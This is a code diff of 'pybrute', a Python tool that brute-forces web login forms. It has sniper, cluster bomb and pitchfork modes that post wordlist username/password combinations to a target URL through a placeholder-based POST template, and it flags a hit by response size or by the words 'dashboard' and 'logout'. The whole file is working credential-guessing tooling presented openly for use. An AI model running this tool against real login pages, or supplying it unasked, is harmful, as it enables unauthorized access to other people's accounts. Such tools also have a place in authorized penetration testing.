@@ -1,13 +1,31 @@
 #!/bin/python3
+
+# imports libraries
 import requests
 import pyfiglet
+import sys
 from termcolor import colored
 import urllib3
+from urllib.parse import parse_qsl
+
 # Banner
 print()
-print(colored(pyfiglet.figlet_format("pybrute", font="slant"), color="blue"))
+print(colored(pyfiglet.figlet_format("pybrute", font="pagga"), color="blue"))
 print(colored("Built By Jahid Hasan", color="green"))
 print()
+
+# important message
+print(colored(f"""
+    *************************************************************
+    * Enter all POST parameters you want to use in this format: *
+    *                                                           *        
+    * param1=value1&param2=value2&param3=value3                 *
+    *                                                           *                
+    * Use {colored("^USER^", color="white")} {colored("for username placeholder", color='red')}                       {colored("*", color='red')}                
+    {colored("*", color='red')} {colored("Use", color='red')} {colored("^PASS^", color="white")} {colored("for password placeholder", color='red')}                       {colored("*", color='red')}                        
+    {colored("*************************************************************", color='red')}
+    """, color='red'))
+
 
 # BruteForce Modes
 print("BruteForce Modes:")
@@ -24,14 +42,15 @@ except KeyboardInterrupt:
 print()
 
 
+
+
 # Sniper Mode
 if mode == "1":
-    print(colored("[+]Sniper Mode Activate", color='blue'))
+    print(colored("[*] Sniper Mode Activate", color='blue'))
 
     try:
         url = input(colored("Enter your target url: ", color="cyan"))
-        user_field = input(colored("Enter username field name: ", color='cyan'))
-        pass_field = input(colored("Enter password field name: ", color='cyan'))
+        param_template = input(colored("Enter post data template: ", color='cyan'))
         username = input(colored("Enter valid username: ", color='cyan'))
         password_list = input(colored("Enter passlist path: ", color='cyan'))
     except KeyboardInterrupt:
@@ -50,10 +69,8 @@ if mode == "1":
         exit()
 
     for passwd in password:
-        post_data = {
-            user_field: username,
-            pass_field: passwd
-        }
+        post_data_string = param_template.replace("^USER^", username).replace("^PASS^", passwd)
+        post_data = dict(parse_qsl(post_data_string))
 
         headers = {
             "User-Agent": "Mozilla/5.0"
@@ -72,26 +89,27 @@ if mode == "1":
         r_text = response.text.lower()
 
         if r_len > 5666:
-            print(colored(f"login successful {username}:{passwd}", color='green'))
+            print(colored(f"[+] login successful {username}:{passwd}", color='green'))
             break
 
         elif "dashboard" in r_text or "logout" in  r_text:
-            print(colored(f"login successful {username}:{passwd}"))
+            print(colored(f"[+] login successful {username}:{passwd}", color="green"))
             break
 
         else:
-            print(colored(f"faild attampt {username}:{passwd}", color='red'))
+            print(colored(f"[-] faild attampt {username}:{passwd}", color='red'))
     else:
         print(colored("no valid credential found", color='red'))
+        
 
 # Cluster Bomb Mode
 if mode == "2":
-    print(colored("[+]Cluster Bomb Mode Activate", color="blue"))
+    print(colored("[*] Cluster Bomb Mode Activate", color="blue"))
 
     try:
         url = input(colored("Enter your target url: ", color="cyan"))
-        user_field = input(colored("Enter username field name: ", color="cyan"))
-        pass_field = input(colored("Enter password field name: ", color="cyan"))
+        param_template = input(colored("Enter post data template: ", color="cyan"))
+
         username_list = input(colored("Enter userlist path: ", color="cyan"))
         password_list = input(colored("Enter passlist path: ", color="cyan"))
     except KeyboardInterrupt:
@@ -128,12 +146,14 @@ if mode == "2":
 
     for user in username:
         for passwd in password:
-            post_data = {
-                user_field: user,
-                pass_field: passwd
-            }
+            post_data_str = param_template.replace("^USER^", user).replace("^PASS^", passwd)
+            post_data = dict(parse_qsl(post_data_str))
             try:
                 response = requests.post(url, data=post_data)
+
+            except requests.exceptions.RequestException as e:
+                print("Request failed:", e)
+                exit()
             except requests.exceptions.ConnectionError:
                 print(colored("please enter valid url", color='red'))
                 exit()
@@ -145,17 +165,17 @@ if mode == "2":
             r_text = response.text.lower()
 
             if r_len > 5666:
-                print(colored(f"login successful {user}:{passwd}", color="green"))
+                print(colored(f"[+] login successful {user}:{passwd}", color="green"))
                 found = True
                 break
 
             elif "dashboard" in r_text or "logout" in r_text:
-                print(colored(f"login successful {user}:{passwd}", color="green"))
+                print(colored(f"[+] login successful {user}:{passwd}", color="green"))
                 found = True
                 break
 
             else:
-                print(colored(f"faild attampt {user}:{passwd}", color="red"))
+                print(colored(f"[-] faild attampt {user}:{passwd}", color="red"))
         else:
             continue
         break
@@ -163,10 +183,8 @@ if mode == "2":
     if not found:
         for passwd in password:
             for user in username:
-                post_data = {
-                    user_field: passwd,
-                    pass_field: user
-                }
+                post_data_str = param_template.replace("^USER^", passwd).replace("^PASS^", user)
+                post_data = dict(parse_qsl(post_data_str))
 
                 try:
                     response = requests.post(url, data=post_data)
@@ -185,27 +203,29 @@ if mode == "2":
 
                 if r_len > 5666:
                     print(colored(f"login successful {passwd}:{user}", color="green"))
+                    exit()
 
                 elif "dashboard" in r_text or "logout" in r_text:
-                    print(colored(f"login successful {passwd}:{user}", color="green"))
+                    print(colored(f"[+] login successful {passwd}:{user}", color="green"))
+                    exit()
 
                 else:
-                    print(colored(f"faild attampt {passwd}:{user}", color="red"))
+                    print(colored(f"[-] faild attampt {passwd}:{user}", color="red"))
             else:
                 continue
             break
         else:
             print(colored(f"no valid credential", color="red"))
+            
 
 # PitchFork Mode
 if mode == "3":
-    print(colored("[+]PitchFork Mode Activate", color="blue"))
+    print(colored("[*] PitchFork Mode Activate", color="blue"))
 
     try:
 
         url = input(colored("Enter your target url: ", color="cyan"))
-        user_field = input(colored("Enter username field name: ", color="cyan"))
-        pass_field = input(colored("Enter password field name: ", color="cyan"))
+        param_template = input(colored("Enter post data template:  ", color="cyan"))
         username_list = input(colored("Enter userlist path: ", color="cyan"))
         password_list = input(colored("Enter passlist path: ", color="cyan"))
 
@@ -238,10 +258,8 @@ if mode == "3":
         exit()
 
     for user, passwd in zip(username, password):
-        post_data = {
-            user_field: user,
-            pass_field: passwd
-        }
+        post_data_str = param_template.replace("^USER^", user).replace("^PASS^", passwd)
+        post_data = dict(parse_qsl(post_data_str))
 
         try:
             response = requests.post(url, data=post_data)
@@ -257,15 +275,15 @@ if mode == "3":
         r_text = response.text.lower()
 
         if r_len > 5666:
-            print(colored(f"login successful {user}:{passwd}", color="green"))
+            print(colored(f"[+] login successful {user}:{passwd}", color="green"))
             break
 
         elif "dashboard" in r_text or "logout" in r_text:
-            print(colored(f"login successful {user}:{passwd}", color="green"))
+            print(colored(f"[+] login successful {user}:{passwd}", color="green"))
             break
 
         else:
-            print(colored(f"faild attampt {user}:{passwd}", color="red"))
+            print(colored(f"[-] faild attampt {user}:{passwd}", color="red"))
 
     else:
         print(colored(f"no valid credential found", color="red"))
